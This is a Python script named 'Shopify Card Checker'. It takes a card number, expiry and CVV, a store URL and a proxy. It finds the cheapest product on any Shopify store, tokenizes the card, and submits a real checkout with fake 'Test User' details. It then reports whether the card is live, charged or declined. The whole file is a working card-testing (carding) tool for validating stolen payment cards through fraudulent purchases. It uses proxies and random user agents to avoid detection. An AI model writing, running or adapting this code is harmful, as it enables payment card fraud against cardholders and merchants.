#!/usr/bin/env python3
"""
Shopify Card Checker - Exact port from user's script
This script is called from Node.js with arguments:
  python checker.py <card> <site_url> <proxy>
  
Returns JSON result to stdout
"""
import sys
import json
import time
import re
import urllib3
import requests
from urllib.parse import urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# User Agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
]

max_retries = 3

def find_between(content, start, end):
    try:
        start_pos = content.index(start) + len(start)
        end_pos = content.index(end, start_pos)
        return content[start_pos:end_pos]
    except ValueError:
        return ''

def get_proxy(proxy_str):
    if not proxy_str:
        return None
    # Parse host:port:user:pass format
    parts = proxy_str.split(':')
    if len(parts) >= 4:
        host = parts[0]
        port = parts[1]
        user = parts[2]
        password = ':'.join(parts[3:])
        proxy_url = f"http://{user}:{password}@{host}:{port}"
    elif len(parts) == 2:
        proxy_url = f"http://{parts[0]}:{parts[1]}"
    else:
        proxy_url = f"http://{proxy_str}"
    
    return {'http': proxy_url, 'https': proxy_url}

def make_request(url, method='GET', headers=None, json_data=None, data=None, cookies=None, proxy=None, timeout=20):
    for attempt in range(max_retries):
        try:
            if method.upper() == 'GET':
                response = requests.get(url, headers=headers, proxies=proxy, 
                                      verify=False, timeout=timeout, cookies=cookies,
                                      allow_redirects=True)
            elif method.upper() == 'POST':
                response = requests.post(url, headers=headers, json=json_data, 
                                       data=data, proxies=proxy, verify=False, 
                                       timeout=timeout, cookies=cookies)
            return response
        except Exception as e:
            if attempt == max_retries - 1:
                raise Exception(f"Request failed: {str(e)}")
            time.sleep(1)

def get_address_details(country_code):
    if country_code == 'US':
        return {
            'address': "420 Park ave",
            'city': "New York",
            'state': "NY",
            'zip': "10016",
            'phone': "(879) 658-2525",
            'country': "United States",
            'currency': "USD",
            'zone_code': "NY"
        }
    elif country_code == 'AU':
        return {
            'address': "134 Buckhurst Street",
            'city': "South Melbourne",
            'state': "VIC",
            'zip': "3205",
            'phone': "07 3803 6136",
            'country': "Australia",
            'currency': "AUD",
            'zone_code': "VIC"
        }
    else:
        return {
            'address': "133 New York 59",
            'city': "Monsey",
            'state': "NY",
            'zip': "10952",
            'phone': "(879) 658-2525",
            'country': "United States",
            'currency': "USD",
            'zone_code': "NY"
        }

def check_card(card_str, site_url, proxy_str):
    import random
    ua = random.choice(USER_AGENTS)
    
    # Parse card
    parts = card_str.strip().split('|')
    if len(parts) < 4:
        return {'status': 'error', 'message': 'Invalid card format'}
    
    cc = parts[0]
    month = parts[1]
    year = parts[2]
    cvv = parts[3]
    
    if len(year) <= 2:
        year = f"20{year}"
    sub_month = str(int(month))
    
    # Parse URL
    if not site_url.startswith(('http://', 'https://')):
        site_url = 'https://' + site_url
    
    parsed_url = urlparse(site_url)
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
    domain = parsed_url.hostname
    
    proxy = get_proxy(proxy_str)
    
    # Step 1: Find product
    try:
        products_url = f"{base_url}/products.json"
        headers = {'User-Agent': ua, 'Accept': 'application/json'}
        response = make_request(products_url, 'GET', headers=headers, proxy=proxy)
        
        if response.status_code != 200:
            return {'status': 'error', 'message': f'Failed to fetch products: HTTP {response.status_code}'}
        
        data = response.json()
        if 'products' not in data:
            return {'status': 'error', 'message': 'Not a Shopify store'}
        
        min_price = None
        best_variant = None
        product_title = ''
        
        for product in data['products']:
            for variant in product.get('variants', []):
                price = float(variant['price'])
                if price >= 0.01 and variant.get('available', True) is not False:
                    if min_price is None or price < min_price:
                        min_price = price
                        best_variant = variant
                        product_title = product['title']
        
        if not best_variant:
            return {'status': 'error', 'message': 'No available products'}
        
        prodid = best_variant['id']
        
    except Exception as e:
        return {'status': 'error', 'message': f'Product search failed: {str(e)}'}
    
    # Step 2: Get initial session (add to cart)
    try:
        cart_url = f"{base_url}/cart/{prodid}:1"
        headers = {
            'User-Agent': ua,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Upgrade-Insecure-Requests': '1',
        }
        
        response = make_request(cart_url, 'GET', headers=headers, proxy=proxy)
        
        if 'recaptcha' in response.text.lower():
            return {'status': 'dead', 'message': 'CAPTCHA detected'}
        
        final_url = response.url
        
        checkout_token = find_between(final_url, '/cn/', '?')
        if not checkout_token:
            checkout_token = find_between(final_url, '/checkouts/', '?')
        
        web_build_id = find_between(response.text, '<meta name="serialized-environment" content="{&quot;commitSha&quot;:&quot;', '&quot;}')
        x_checkout_one_session_token = find_between(response.text, '<meta name="serialized-session-token" content="&quot;', '&quot;"')
        queue_token = find_between(response.text, 'queueToken&quot;:&quot;', '&quot;')
        stable_id = find_between(response.text, 'stableId&quot;:&quot;', '&quot;')
        payment_method_identifier = find_between(response.text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
        
        country_code_match = re.search(r'"supportedCountries":"([^"]+)"', response.text)
        country_code = country_code_match.group(1) if country_code_match else 'US'
        
        if not checkout_token:
            return {'status': 'unknown', 'message': 'Failed to get checkout token'}
            
    except Exception as e:
        return {'status': 'error', 'message': f'Session failed: {str(e)}'}
    
    # Step 3: Get credit card token/nonce
    try:
        token_headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json',
            'origin': 'https://checkout.shopifycs.com',
            'referer': 'https://checkout.shopifycs.com/',
            'user-agent': ua
        }
        
        payload = {
            "credit_card": {
                "number": cc,
                "month": int(sub_month),
                "year": int(year),
                "verification_value": cvv,
                "name": "Test User"
            },
            "payment_session_scope": domain
        }
        
        response = make_request("https://deposit.shopifycs.com/sessions", 
                               'POST', headers=token_headers, json_data=payload, proxy=proxy)
        
        response_json = response.json()
        cctoken = response_json.get('id')
        
        if not cctoken:
            errors = response_json.get('errors', [])
            if errors:
                error_msg = ', '.join(errors) if isinstance(errors, list) else str(errors)
                return {'status': 'dead', 'message': f'Card Declined: {error_msg}'}
            return {'status': 'dead', 'message': 'Card token not returned'}
            
    except Exception as e:
        return {'status': 'dead', 'message': f'Tokenization failed: {str(e)}'}
    
    # Step 4: Proposal and shipping (GraphQL)
    try:
        address = get_address_details(country_code)
        
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-GB',
            'content-type': 'application/json',
            'origin': base_url,
            'referer': f'{base_url}/',
            'user-agent': ua,
            'x-checkout-one-session-token': x_checkout_one_session_token,
            'x-checkout-web-build-id': web_build_id,
            'x-checkout-web-source-id': checkout_token
        }
        
        propayload = {
            "operationName": "Negotiate",
            "variables": {
                "buyerIdentity": {
                    "countryCode": country_code,
                    "email": "test@test.com",
                    "phone": address['phone']
                },
                "delivery": {
                    "deliveryAddress": {
                        "address1": address['address'],
                        "city": address['city'],
                        "countryCode": country_code,
                        "firstName": "Test",
                        "lastName": "User",
                        "phone": address['phone'],
                        "postalCode": address['zip'],
                        "zoneCode": address['zone_code']
                    }
                },
                "sessionInput": {
                    "sessionToken": queue_token
                }
            },
            "query": "mutation Negotiate($buyerIdentity: BuyerIdentityInput, $delivery: DeliveryInput, $sessionInput: SessionTokenInput!) { session(sessionInput: $sessionInput) { negotiate(buyerIdentity: $buyerIdentity, delivery: $delivery) { result { ... on NegotiationResultSuccess { sellerProposal { ...SellerProposalDetails } } } } } } fragment SellerProposalDetails on SellerProposal { delivery { deliveryLines { availableDeliveryStrategies { handle title amount { value { amount currencyCode } } } selectedDeliveryStrategy { handle } } } tax { totalTaxAmount { value { amount } } } runningTotal { value { amount currencyCode } } }"
        }
        
        response = make_request(
            f"{base_url}/checkouts/unstable/graphql",
            'POST',
            headers=headers,
            json_data=propayload,
            proxy=proxy
        )
        
        # Parse gateway
        gateway_info = re.search(r'"extensibilityDisplayName":"([^"]+)"', response.text)
        if gateway_info:
            gateway = gateway_info.group(1)
            gateway_result = f"Shopify + {gateway}" if gateway != "Shopify Payments" else "Shopify Payments"
        else:
            gateway_result = "Shopify Payments"
        
        data = response.json()
        seller_proposal = data.get("data", {}).get("session", {}).get("negotiate", {}).get("result", {}).get("sellerProposal")
        
        if not seller_proposal:
            return {'status': 'live', 'message': f'Tokenized OK | {gateway_result} | ${min_price}'}
        
        # Get handle for shipping
        handle = seller_proposal.get("delivery", {}).get("deliveryLines", [{}])[0].get("availableDeliveryStrategies", [{}])[0].get("handle", "")
        total_amount = seller_proposal.get("runningTotal", {}).get("value", {}).get("amount", min_price)
        
    except Exception as e:
        return {'status': 'live', 'message': f'Tokenized | {str(e)[:50]}'}
    
    # Step 5: Submit for completion
    try:
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US',
            'content-type': 'application/json',
            'origin': base_url,
            'referer': f'{base_url}/',
            'user-agent': ua,
            'x-checkout-one-session-token': x_checkout_one_session_token,
            'x-checkout-web-deploy-stage': 'production',
            'x-checkout-web-source-id': checkout_token
        }
        
        payload = {
            "operationName": "SubmitForCompletion",
            "variables": {
                "sessionInput": {
                    "sessionToken": queue_token
                },
                "paymentMethod": {
                    "creditCard": {
                        "paymentMethodIdentifier": payment_method_identifier,
                        "sessionId": cctoken
                    }
                },
                "billingAddress": {
                    "address1": address['address'],
                    "city": address['city'],
                    "countryCode": country_code,
                    "firstName": "Test",
                    "lastName": "User",
                    "phone": address['phone'],
                    "postalCode": address['zip'],
                    "zoneCode": address['zone_code']
                }
            },
            "query": "mutation SubmitForCompletion($paymentMethod: PaymentMethodInput, $sessionInput: SessionTokenInput!, $billingAddress: MailingAddressInput) { submitForCompletion(paymentMethod: $paymentMethod, sessionInput: $sessionInput, billingAddress: $billingAddress) { ... on SubmitSuccess { receipt { id } } ... on SubmitFailed { reason } ... on SubmitAlreadyAccepted { receipt { id } } } }"
        }
        
        submit_url = f'{base_url}/checkouts/unstable/graphql?operationName=SubmitForCompletion'
        response = make_request(submit_url, 'POST', headers=headers, json_data=payload, proxy=proxy)
        response_text = response.text
        
        if 'CAPTCHA_METADATA_MISSING' in response_text:
            return {'status': 'unknown', 'message': 'CAPTCHA Required'}
        
        response_json = response.json()
        receipt_id = response_json.get("data", {}).get("submitForCompletion", {}).get("receipt", {}).get("id")
        
        if not receipt_id:
            # Check for error messages
            if 'CARD_DECLINED' in response_text or 'declined' in response_text.lower():
                return {'status': 'dead', 'message': f'Declined | {gateway_result}'}
            elif 'INSUFFICIENT_FUNDS' in response_text:
                return {'status': 'live', 'message': f'CCN (Insufficient Funds) | {gateway_result}'}
            elif 'INCORRECT_CVC' in response_text:
                return {'status': 'live', 'message': f'CCN (Incorrect CVC) | {gateway_result}'}
            elif 'INCORRECT_ZIP' in response_text:
                return {'status': 'live', 'message': f'CCN (Incorrect ZIP) | {gateway_result}'}
            elif 'EXPIRED_CARD' in response_text:
                return {'status': 'dead', 'message': f'Expired Card | {gateway_result}'}
            elif 'INVALID_NUMBER' in response_text:
                return {'status': 'dead', 'message': f'Invalid Number | {gateway_result}'}
            elif 'PROCESSING_ERROR' in response_text:
                return {'status': 'dead', 'message': f'Processing Error | {gateway_result}'}
            
            return {'status': 'unknown', 'message': f'No Receipt | {gateway_result}'}
            
    except Exception as e:
        return {'status': 'dead', 'message': f'Submit failed: {str(e)}'}
    
    # Step 6: Poll for receipt
    try:
        time.sleep(2)
        
        purl = f"{base_url}/checkouts/unstable/graphql?operationName=PollForReceipt"
        phead = {
            'accept': 'application/json',
            'content-type': 'application/json',
            'origin': base_url,
            'referer': f'{base_url}/',
            'user-agent': ua,
            'x-checkout-one-session-token': x_checkout_one_session_token,
            'x-checkout-web-build-id': web_build_id,
            'x-checkout-web-source-id': checkout_token
        }
        
        pload = {
            "operationName": "PollForReceipt",
            "variables": {
                "receiptId": receipt_id
            },
            "query": "query PollForReceipt($receiptId: ID!) { receipt(receiptId: $receiptId) { ... on ProcessedReceipt { id redirectUrl } ... on ProcessingReceipt { id pollDelay } ... on ActionRequiredReceipt { id action { ... on CompletePaymentChallenge { __typename } } } ... on FailedReceipt { id processingError { ... on PaymentFailed { code } } } } }"
        }
        
        response = make_request(purl, 'POST', headers=phead, json_data=pload, proxy=proxy)
        response_text = response.text
        response_json = response.json()
        
        # Determine final status - matching original script responses exactly
        if f"{base_url}/thank_you" in response_text or f"{base_url}/post_purchase" in response_text:
            return {'status': 'live', 'message': f'[CHARGED] SUCCESS! | Amount: ${total_amount} | Gateway: {gateway_result}'}
        
        elif 'Your order is confirmed' in response_text:
            return {'status': 'live', 'message': f'[ORDER PLACED] SUCCESS! | Amount: ${total_amount}'}
        
        elif 'INCORRECT_ZIP' in response_text:
            return {'status': 'live', 'message': f'[CHARGED] INCORRECT ZIP! | Amount: ${total_amount}'}
        
        elif 'INSUFFICIENT_FUNDS' in response_text:
            return {'status': 'live', 'message': f'[CHARGED] INSUFFICIENT FUNDS! | Amount: ${total_amount}'}
        
        elif 'INCORRECT_CVC' in response_text:
            return {'status': 'live', 'message': f'[CCN] INCORRECT CVC! | Amount: ${total_amount}'}
        
        elif 'CompletePaymentChallenge' in response_text or 'AUTHORIZATION_ERROR' in response_text:
            return {'status': 'live', 'message': f'[3DS] VERIFICATION REQUIRED! | Amount: ${total_amount}'}
        
        elif '/authentications/' in response_text:
            return {'status': 'live', 'message': f'[3DS] CARD REQUIRES 3D SECURE! | Amount: ${total_amount}'}
        
        elif 'processingError' in response_text:
            error_code = response_json.get('data', {}).get('receipt', {}).get('processingError', {}).get('code', 'Unknown Error')
            return {'status': 'dead', 'message': f'[DEAD] {error_code} | Amount: ${total_amount}'}
        
        else:
            return {'status': 'unknown', 'message': f'[UNKNOWN] Response needs review'}
            
    except Exception as e:
        return {'status': 'unknown', 'message': f'[ERROR] {str(e)}'}

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print(json.dumps({'status': 'error', 'message': 'Usage: checker.py <card> <site_url> <proxy>'}))
        sys.exit(1)
    
    card = sys.argv[1]
    site_url = sys.argv[2]
    proxy = sys.argv[3] if len(sys.argv) > 3 else ""
    
    result = check_card(card, site_url, proxy)
    print(json.dumps(result))
